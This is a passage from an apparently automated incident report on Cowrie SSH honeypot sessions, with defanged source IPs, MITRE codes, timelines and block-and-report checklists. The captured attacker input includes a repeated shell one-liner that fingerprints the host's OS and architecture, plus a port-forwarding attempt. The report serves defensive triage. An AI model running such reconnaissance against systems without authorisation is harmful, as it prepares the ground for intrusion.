| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:34:26` | `cowrie.session.connect` |
| `2026-07-10 12:34:27` | `cowrie.client.version` |
| `2026-07-10 12:34:27` | `cowrie.client.kex` |
| `2026-07-10 12:34:32` | `cowrie.login.success` |
| `2026-07-10 12:34:35` | `cowrie.session.params` |
| `2026-07-10 12:34:35` | `cowrie.command.input` |
| `2026-07-10 12:34:36` | `cowrie.log.closed` |
| `2026-07-10 12:34:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdb9d6136529

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:34 |
| **Last Seen** | 2026-07-10 12:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:34:35` | `cowrie.session.connect` |
| `2026-07-10 12:34:35` | `cowrie.client.version` |
| `2026-07-10 12:34:35` | `cowrie.client.kex` |
| `2026-07-10 12:34:36` | `cowrie.login.success` |
| `2026-07-10 12:34:37` | `cowrie.session.params` |
| `2026-07-10 12:34:37` | `cowrie.command.input` |
| `2026-07-10 12:34:37` | `cowrie.command.input` |
| `2026-07-10 12:34:37` | `cowrie.command.input` |
| `2026-07-10 12:34:37` | `cowrie.command.input` |
| `2026-07-10 12:34:37` | `cowrie.command.input` |
| `2026-07-10 12:34:37` | `cowrie.command.success` |
| `2026-07-10 12:34:37` | `cowrie.command.input` |
| `2026-07-10 12:34:37` | `cowrie.command.input` |
| `2026-07-10 12:34:37` | `cowrie.command.input` |
| `2026-07-10 12:34:37` | `cowrie.command.input` |
| `2026-07-10 12:34:37` | `cowrie.log.closed` |
| `2026-07-10 12:34:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed9085f6394c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:36 |
| **Last Seen** | 2026-07-10 12:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:36:02` | `cowrie.session.connect` |
| `2026-07-10 12:36:02` | `cowrie.client.version` |
| `2026-07-10 12:36:02` | `cowrie.client.kex` |
| `2026-07-10 12:36:02` | `cowrie.login.success` |
| `2026-07-10 12:36:03` | `cowrie.session.params` |
| `2026-07-10 12:36:03` | `cowrie.command.input` |
| `2026-07-10 12:36:03` | `cowrie.command.input` |
| `2026-07-10 12:36:03` | `cowrie.command.input` |
| `2026-07-10 12:36:03` | `cowrie.command.input` |
| `2026-07-10 12:36:03` | `cowrie.command.input` |
| `2026-07-10 12:36:03` | `cowrie.command.success` |
| `2026-07-10 12:36:03` | `cowrie.command.input` |
| `2026-07-10 12:36:03` | `cowrie.command.input` |
| `2026-07-10 12:36:03` | `cowrie.command.input` |
| `2026-07-10 12:36:03` | `cowrie.command.input` |
| `2026-07-10 12:36:03` | `cowrie.log.closed` |
| `2026-07-10 12:36:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3723fcd11ac

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:37 |
| **Last Seen** | 2026-07-10 12:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:37:20` | `cowrie.session.connect` |
| `2026-07-10 12:37:21` | `cowrie.client.version` |
| `2026-07-10 12:37:21` | `cowrie.client.kex` |
| `2026-07-10 12:37:22` | `cowrie.login.success` |
| `2026-07-10 12:37:23` | `cowrie.session.params` |
| `2026-07-10 12:37:23` | `cowrie.command.input` |
| `2026-07-10 12:37:23` | `cowrie.command.input` |
| `2026-07-10 12:37:23` | `cowrie.command.input` |
| `2026-07-10 12:37:23` | `cowrie.command.input` |
| `2026-07-10 12:37:23` | `cowrie.command.input` |
| `2026-07-10 12:37:23` | `cowrie.command.success` |
| `2026-07-10 12:37:23` | `cowrie.command.input` |
| `2026-07-10 12:37:23` | `cowrie.command.input` |
| `2026-07-10 12:37:23` | `cowrie.command.input` |
| `2026-07-10 12:37:23` | `cowrie.command.input` |
| `2026-07-10 12:37:23` | `cowrie.log.closed` |
| `2026-07-10 12:37:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efdc163df9a3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:38 |
| **Last Seen** | 2026-07-10 12:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:38:35` | `cowrie.session.connect` |
| `2026-07-10 12:38:35` | `cowrie.client.version` |
| `2026-07-10 12:38:35` | `cowrie.client.kex` |
| `2026-07-10 12:38:36` | `cowrie.login.success` |
| `2026-07-10 12:38:38` | `cowrie.session.params` |
| `2026-07-10 12:38:38` | `cowrie.command.input` |
| `2026-07-10 12:38:38` | `cowrie.command.input` |
| `2026-07-10 12:38:38` | `cowrie.command.input` |
| `2026-07-10 12:38:38` | `cowrie.command.input` |
| `2026-07-10 12:38:38` | `cowrie.command.input` |
| `2026-07-10 12:38:38` | `cowrie.command.success` |
| `2026-07-10 12:38:38` | `cowrie.command.input` |
| `2026-07-10 12:38:38` | `cowrie.command.input` |
| `2026-07-10 12:38:38` | `cowrie.command.input` |
| `2026-07-10 12:38:38` | `cowrie.command.input` |
| `2026-07-10 12:38:38` | `cowrie.log.closed` |
| `2026-07-10 12:38:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a69699f9fdc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:39 |
| **Last Seen** | 2026-07-10 12:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:39:49` | `cowrie.session.connect` |
| `2026-07-10 12:39:49` | `cowrie.client.version` |
| `2026-07-10 12:39:49` | `cowrie.client.kex` |
| `2026-07-10 12:39:51` | `cowrie.login.success` |
| `2026-07-10 12:39:51` | `cowrie.session.params` |
| `2026-07-10 12:39:51` | `cowrie.command.input` |
| `2026-07-10 12:39:51` | `cowrie.command.input` |
| `2026-07-10 12:39:52` | `cowrie.command.input` |
| `2026-07-10 12:39:52` | `cowrie.command.input` |
| `2026-07-10 12:39:52` | `cowrie.command.input` |
| `2026-07-10 12:39:52` | `cowrie.command.success` |
| `2026-07-10 12:39:52` | `cowrie.command.input` |
| `2026-07-10 12:39:52` | `cowrie.command.input` |
| `2026-07-10 12:39:52` | `cowrie.command.input` |
| `2026-07-10 12:39:52` | `cowrie.command.input` |
| `2026-07-10 12:39:52` | `cowrie.log.closed` |
| `2026-07-10 12:39:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-565566ba1a0a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:41 |
| **Last Seen** | 2026-07-10 12:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:41:02` | `cowrie.session.connect` |
| `2026-07-10 12:41:02` | `cowrie.client.version` |
| `2026-07-10 12:41:02` | `cowrie.client.kex` |
| `2026-07-10 12:41:03` | `cowrie.login.success` |
| `2026-07-10 12:41:04` | `cowrie.session.params` |
| `2026-07-10 12:41:04` | `cowrie.command.input` |
| `2026-07-10 12:41:04` | `cowrie.command.input` |
| `2026-07-10 12:41:04` | `cowrie.command.input` |
| `2026-07-10 12:41:04` | `cowrie.command.input` |
| `2026-07-10 12:41:04` | `cowrie.command.input` |
| `2026-07-10 12:41:04` | `cowrie.command.success` |
| `2026-07-10 12:41:04` | `cowrie.command.input` |
| `2026-07-10 12:41:04` | `cowrie.command.input` |
| `2026-07-10 12:41:04` | `cowrie.command.input` |
| `2026-07-10 12:41:04` | `cowrie.command.input` |
| `2026-07-10 12:41:05` | `cowrie.log.closed` |
| `2026-07-10 12:41:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b0ed8d74ed1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:42 |
| **Last Seen** | 2026-07-10 12:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:42:16` | `cowrie.session.connect` |
| `2026-07-10 12:42:16` | `cowrie.client.version` |
| `2026-07-10 12:42:16` | `cowrie.client.kex` |
| `2026-07-10 12:42:17` | `cowrie.login.success` |
| `2026-07-10 12:42:19` | `cowrie.session.params` |
| `2026-07-10 12:42:19` | `cowrie.command.input` |
| `2026-07-10 12:42:19` | `cowrie.command.input` |
| `2026-07-10 12:42:19` | `cowrie.command.input` |
| `2026-07-10 12:42:19` | `cowrie.command.input` |
| `2026-07-10 12:42:19` | `cowrie.command.input` |
| `2026-07-10 12:42:19` | `cowrie.command.success` |
| `2026-07-10 12:42:19` | `cowrie.command.input` |
| `2026-07-10 12:42:19` | `cowrie.command.input` |
| `2026-07-10 12:42:19` | `cowrie.command.input` |
| `2026-07-10 12:42:19` | `cowrie.command.input` |
| `2026-07-10 12:42:19` | `cowrie.log.closed` |
| `2026-07-10 12:42:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70cff195eca9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:43 |
| **Last Seen** | 2026-07-10 12:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:43:31` | `cowrie.session.connect` |
| `2026-07-10 12:43:32` | `cowrie.client.version` |
| `2026-07-10 12:43:32` | `cowrie.client.kex` |
| `2026-07-10 12:43:33` | `cowrie.login.success` |
| `2026-07-10 12:43:34` | `cowrie.session.params` |
| `2026-07-10 12:43:34` | `cowrie.command.input` |
| `2026-07-10 12:43:34` | `cowrie.command.input` |
| `2026-07-10 12:43:34` | `cowrie.command.input` |
| `2026-07-10 12:43:34` | `cowrie.command.input` |
| `2026-07-10 12:43:34` | `cowrie.command.input` |
| `2026-07-10 12:43:34` | `cowrie.command.success` |
| `2026-07-10 12:43:34` | `cowrie.command.input` |
| `2026-07-10 12:43:34` | `cowrie.command.input` |
| `2026-07-10 12:43:34` | `cowrie.command.input` |
| `2026-07-10 12:43:34` | `cowrie.command.input` |
| `2026-07-10 12:43:34` | `cowrie.log.closed` |
| `2026-07-10 12:43:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e0844ba6281

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:44 |
| **Last Seen** | 2026-07-10 12:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:44:46` | `cowrie.session.connect` |
| `2026-07-10 12:44:46` | `cowrie.client.version` |
| `2026-07-10 12:44:46` | `cowrie.client.kex` |
| `2026-07-10 12:44:47` | `cowrie.login.success` |
| `2026-07-10 12:44:49` | `cowrie.session.params` |
| `2026-07-10 12:44:49` | `cowrie.command.input` |
| `2026-07-10 12:44:49` | `cowrie.command.input` |
| `2026-07-10 12:44:49` | `cowrie.command.input` |
| `2026-07-10 12:44:49` | `cowrie.command.input` |
| `2026-07-10 12:44:49` | `cowrie.command.input` |
| `2026-07-10 12:44:49` | `cowrie.command.success` |
| `2026-07-10 12:44:49` | `cowrie.command.input` |
| `2026-07-10 12:44:49` | `cowrie.command.input` |
| `2026-07-10 12:44:49` | `cowrie.command.input` |
| `2026-07-10 12:44:49` | `cowrie.command.input` |
| `2026-07-10 12:44:49` | `cowrie.log.closed` |
| `2026-07-10 12:44:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf0e8cca3c70

| Field | Detail |
|---|---|
| **Source IP** | `74.208.177[.]56` |
| **First Seen** | 2026-07-10 12:45 |
| **Last Seen** | 2026-07-10 12:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:45:30` | `cowrie.session.connect` |
| `2026-07-10 12:45:30` | `cowrie.client.version` |
| `2026-07-10 12:45:30` | `cowrie.client.kex` |
| `2026-07-10 12:45:31` | `cowrie.login.success` |
| `2026-07-10 12:45:32` | `cowrie.direct-tcpip.request` |
| `2026-07-10 12:45:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.208.177[.]56` to AbuseIPDB if not already reported
- [ ] Block `74.208.177[.]56` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57af9ef92911

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-10 12:45 |
| **Last Seen** | 2026-07-10 12:46 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:45:53` | `cowrie.session.connect` |
| `2026-07-10 12:45:54` | `cowrie.client.version` |
| `2026-07-10 12:45:54` | `cowrie.client.kex` |
| `2026-07-10 12:46:00` | `cowrie.login.success` |
| `2026-07-10 12:46:04` | `cowrie.session.params` |
| `2026-07-10 12:46:04` | `cowrie.command.input` |
| `2026-07-10 12:46:05` | `cowrie.log.closed` |
| `2026-07-10 12:46:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcc30567b786

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:45 |
| **Last Seen** | 2026-07-10 12:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:45:58` | `cowrie.session.connect` |
| `2026-07-10 12:45:59` | `cowrie.client.version` |
| `2026-07-10 12:45:59` | `cowrie.client.kex` |
| `2026-07-10 12:46:00` | `cowrie.login.success` |
| `2026-07-10 12:46:01` | `cowrie.session.params` |
| `2026-07-10 12:46:01` | `cowrie.command.input` |
| `2026-07-10 12:46:01` | `cowrie.command.input` |
| `2026-07-10 12:46:01` | `cowrie.command.input` |
| `2026-07-10 12:46:01` | `cowrie.command.input` |
| `2026-07-10 12:46:01` | `cowrie.command.input` |
| `2026-07-10 12:46:01` | `cowrie.command.success` |
| `2026-07-10 12:46:01` | `cowrie.command.input` |
| `2026-07-10 12:46:01` | `cowrie.command.input` |
| `2026-07-10 12:46:01` | `cowrie.command.input` |
| `2026-07-10 12:46:01` | `cowrie.command.input` |
| `2026-07-10 12:46:02` | `cowrie.log.closed` |
| `2026-07-10 12:46:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f3ed86fff59

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 12:47 |
| **Last Seen** | 2026-07-10 12:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 12:47:13` | `cowrie.session.connect` |
| `2026-07-10 12:47:13` | `cowrie.client.version` |
| `2026-07-10 12:47:13` | `cowrie.client.kex` |
| `2026-07-10 12:47:14` | `cowrie.login.success` |
| `2026-07-10 12:47:15` | `cowrie.session.params` |
| `2026-07-10 12:47:15` | `cowrie.command.input` |
| `2026-07-10 12:47:15` | `cowrie.command.input` |
| `2026-07-10 12:47:15` | `cowrie.command.input` |
| `2026-07-10 12:47:15` | `cowrie.command.input` |
| `2026-07-10 12:47:15` | `cowrie.command.input` |
| `2026-07-10 12:47:15` | `cowrie.command.success` |
| `2026-07-10 12:47:15` | `cowrie.command.input` |
